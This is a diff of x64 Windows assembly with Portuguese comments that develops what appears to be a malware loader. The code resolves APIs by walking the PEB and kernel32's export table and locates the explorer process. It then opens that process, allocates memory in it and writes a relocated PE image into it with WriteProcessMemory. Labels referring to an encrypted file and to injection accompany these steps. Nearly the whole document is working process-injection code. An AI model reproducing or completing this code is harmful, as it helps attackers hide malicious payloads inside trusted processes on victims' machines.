@@ -9,6 +9,7 @@ section .data
         Buffer times 50000 db 0
         addressAlocado times 8 dq 0
         addressAlocadoEx times 8 dq 0
+        handle times 8 dq 0
 section .text
 
 WinMain:
@@ -45,8 +46,7 @@ WinMain:
         call CriaArquivoEncriptado 
         call PrepareInject
 
-        
-        
+         
         Encrypt:
                 xor rcx,rcx
                 xor rax,rax
@@ -157,7 +157,6 @@ WinMain:
 
         Data:
                
-
                 mov rsi, rdi ;Aqruivo T0.exe
                 add rsi, 0x3c
                 mov rdx, [rsi]
@@ -353,7 +352,6 @@ WinMain:
                 mov rbx,rax
                 add rsp, 0x10
         
-
         LocomoveParaOFimDoarquivo:
                 ;Lookup fseek
                 mov rax, "fseek"
@@ -470,8 +468,7 @@ WinMain:
                 add rsp, 0x30
                 add rsp, 0x08
         ret
-        
-            
+             
         ;locate_kernel32
         Locate_kernel32: 
                 xor rcx, rcx;             # Zera RCX
@@ -537,7 +534,6 @@ WinMain:
                 add rsp, 0x10
                 mov [addressAlocado], rax
 
-
                 xor rcx,rcx
                 xor rdx,rdx
                 mov rsi, r13
@@ -565,10 +561,7 @@ WinMain:
                 push rax
                 mov rax, "CreateTo"
                 push rax
-                mov [rsp+24], dword 0x00
-                
-             
-             
+                mov [rsp+24], dword 0x00   
 
                 lea rdx, [rsp]
                 mov rcx, rdi
@@ -584,7 +577,6 @@ WinMain:
                 mov [rbp+0xD8], rax
                 add rsp, 0x30
                 add rsp, 0x10
-
 
                 ; pega o endereco LoadLibraryA usando GetProcAddress
                 mov rcx, 0x41797261;  
@@ -610,8 +602,6 @@ WinMain:
                 mov r15,rax
                 add rsp, 0x30
                 add rsp, 0x10
-
-
 
                 ;Lookup strcmp
                 mov rax, "strcmp"
@@ -652,8 +642,7 @@ WinMain:
                 mov rax, "explorer"
                 push rax
                 mov [rbp+0xF0], rsp
-
-              
+         
                 mov eax, 0x130
                 mov [rbp-0x60], eax
         ProcessNext:        
@@ -679,7 +668,6 @@ WinMain:
                                 mov rcx,rax
                                 call r13
 
-
                         FimGetPid:
                                 mov rbp,rax
                                 add rsp, 0x160
@@ -701,8 +689,7 @@ WinMain:
                                 add rsp, 0x30
                                 add rsp, 0x10
 
-
-                        OpenProcess:
+                                OpenProcess:
                                 ;Lookup OpenProcess
                                 mov rax, "ess"
                                 push rax
@@ -723,6 +710,8 @@ WinMain:
                                 call r12
                                 mov rbp, rax
                                 add rsp, 0x30
+                                mov r13, rax
+                                mov [handle], rax
 
                         VirtualAllocEx:
                                 ;Lookup VirtualAllocEx
@@ -750,26 +739,99 @@ WinMain:
                                 mov r11,rax
                                 mov [addressAlocadoEx], rax
                                 
+                        GetModuleHandleW:
+                                ;Lookup GetModuleHandleW
+                                mov rax, "eHandleW"
+                                push rax
+                                mov rax, "GetModul"
+                                push rax
+                                lea rdx, [rsp]
+                                mov rcx, r15
+                                sub rsp, 0x30
+                                call r14
+                                mov r12, rax
+                                add rsp, 0x30
+
+                                ;call GetModuleHandleW
+                                xor ecx,ecx
+                                sub rsp, 0x30
+                                call r12
+                                mov rbp, rax
+                                add rsp, 0x30
+                                mov r13, rax
+
+                                mov rax, [addressAlocado]
+                                movsxd r14, dword [rax+0x3c]
+                                add r14,rax
+            
                                 ;Calcula Delta
+                                xor r15d,r15d
+                                xor rcx,rcx
                                 mov r12,rdi
-                                mov r14,rdi
-                                add r14, 0x3c
+                                mov r15,rdi
+                                add r15, 0x3c
                                 xor rdi,rdi
-                                mov rdi, [r14]
+                                mov rdi, [r15]
                                 shl rdi, 0xB0
                                 shr rdi, 0xB0
-                                mov r14, r12
-                                add r14, rdi
-                                mov r10d, [r14+0xB0]
-                                xor r15d,r15d
-                                mov rsi, [addressAlocado]
+                                mov r15, r12
+                                add r15, rdi
+                                mov r10d, dword [r14+0xB0]
+                                
+                                xor rbx,rbx
+                                mov rbx, [addressAlocado]
+                                mov rsi, rbx
                                 add r10, rsi
-                             
+                                xor rbx,rbx
+                                mov rbx, [addressAlocadoEx]
+                                mov rdi, rbx
+                                sub rdi, R14
+                                mov r11, rbx
+                                mov ecx, dword [r10+0x04]
+                                mov rax, rbx
+                                test ecx,ecx
 
-                        call Locate_kernel32
+                                je Fim
+                                xor rbx,rbx
+                                mov ebx, 0xFFF
+                                nop
+                        Fim5:
+                                mov r9d,ecx
+                                movzx r8d,r15w
+                                sub r9, 0x08
+                                shr r9, 0x8
+                                shr r9, 0x1
+                                test r9d, r9d
+                                je Fim2
+                                nop
+                                nop
+                        Fim4:
+                                movsx rax, r8w
+                                movzx eax, word [r10+rax*2+8]
+                                test bx,ax
+                                je Fim3
+                                mov edx, dword [r10]
+                                and rax,rbx
+                                lea rcx, qword [rsi+rax] 
+                                add qword [rdx+rcx],rdi
+                        Fim3: 
+                                inc r8w
+                                movsx eax, r8w
+                                cmp eax, r9d
+                                jb Fim4
+                                mov ecx, dword [r10+0x04]
+                        Fim2:   
+                                mov eax,ecx
+                                add r10,rax
+                                mov ecx, dword [r10+0x04]
+                                test ecx,ecx
+                                jne Fim5
+                        Fim: 
+
+                        ;call Locate_kernel32
+                        call GetProcAddres
                         call LoadLibrary
 
-                
                         ;Load kernelbase.dll
                         mov rax, "se.dll"     
                         push rax
@@ -781,7 +843,6 @@ WinMain:
                         mov r15,rax
                         add rsp, 0x30
                         add rsp, 0x10
-
 
                         WriteProcess:
                                 ;Lookup WriteProcessMemory
@@ -799,17 +860,16 @@ WinMain:
                                 add rsp, 0x30
 
                                 ;call WriteProcessMemory
-                                mov r9d, dword [r14+0x50]
-                                mov r8, rsi
-                                mov rdx, r11
+                                mov r9d, [r14+0x50]
+                                mov r8, [addressAlocado]
+                                mov rdx, [addressAlocadoEx]
+                                xor r15,r15
                                 mov [rsp+0x20],r15
-                                mov rcx, rbp
+                                mov rcx, [handle]
                                 call r12
                                 mov rbp, rax
                                 add rsp, 0x30     
                                
-                        
-
 
                         call Locate_kernel32
                         ;lookup ExitProcess
@@ -824,5 +884,58 @@ WinMain:
                                 mov r12 ,rax
 
                                 call r12
-                                                
+
+        GetProcAddres:
+                xor r11,r11
+                xor r13,r13
+                xor rcx, rcx;             # Zera RCX
+                mov rax, gs:[rcx + 0x60]; # 0x060 ProcessEnvironmentBlock to RAX.
+                mov rax, [rax + 0x18];    # 0x18  ProcessEnvironmentBlock.Ldr Offset
+                mov rsi, [rax + 0x20];    # 0x20 Offset = ProcessEnvironmentBlock.Ldr.InMemoryOrderModuleList
+                lodsq;                    # Load qword at address (R)SI into RAX (ProcessEnvironmentBlock.Ldr.InMemoryOrderModuleList)
+                xchg rax, rsi;            # troca RAX,RSI
+                lodsq;                    # Load qword at address (R)SI into RAX
+                mov rbx, [rax + 0x20] ;   # RBX = Kernel32 base address
+                mov r8, rbx;              # Copia o endereco base do Kernel32 para o registrador R8
+                  
+                ; Código para chegar na tabela de endereco de exportacao
+                mov ebx, [rbx+0x3C];  # obtem o endereco da assinatura do  PE do Kernel32 e coloca em  EBX
+                add rbx, r8;          # Add defrerenced signature offset to kernel32 base. Store in RBX.
+                mov r12, 0x88FFFFF;      
+                shr r12, 0x14; 
+                mov edx, [rbx+r12];   # Offset from PE32 Signature to Export Address Table (NULL BYTE)
+                add rdx, r8;          # RDX = kernel32.dll + RVA ExportTable = ExportTable Address
+                mov r10d, [rdx+0x14]; # numero de funcoes
+                xor r11, r11;         # Zera R11 para ser usado 
+                mov r11d, [rdx+0x20]; # AddressOfNames RVA
+                add r11, r8;          # AddressOfNames VMA
+
+        FinFunctionGetProcAddress2:
+                mov rcx, r10;                        # Set loop counter
+                kernel32findfunction2:  
+                        jecxz FunctionNameFound2;     # Percorra esta função até encontrarmos GetProcA
+                        xor ebx,ebx;                 # Zera EBX para ser usada
+                        mov ebx, [r11+4+rcx*4];      # EBX = RVA para o primeiro AddressOfName
+                        add rbx, r8;                 # RBX = Nome da funcao VMA
+                        dec rcx;                     # Decrementa o loop em 1
+                        mov rax, 0x41636f7250746547; # GetProcA
+                        cmp [rbx], rax;              # checa se rbx é igual a  GetProcA
+                        jnz kernel32findfunction2;  
+        
+        ; Encontra o endereço da função de GetProcessAddress
+        FunctionNameFound2:                 
+                ; We found our target
+                xor r11, r11; 
+                mov r11d, [rdx+0x24];   # AddressOfNameOrdinals RVA
+                add r11, r8;            # AddressOfNameOrdinals VMA
+                ; Get the function ordinal from AddressOfNameOrdinals
+                inc rcx; 
+                mov r13w, [r11+rcx*2];  # AddressOfNameOrdinals + Counter. RCX = counter
+                ; Get function address from AddressOfFunctions
+                xor r11, r11; 
+                mov r11d, [rdx+0x1c];   # AddressOfFunctions RVA
+                add r11, r8;            # AddressOfFunctions VMA in R11. Kernel32+RVA for addressoffunctions
+                mov eax, [r11+4+r13*4]; # Get the function RVA.
+                add rax, r8;            # Add base address to function RVA
+                mov r14, rax;           # GetProcAddress to R14
 ret
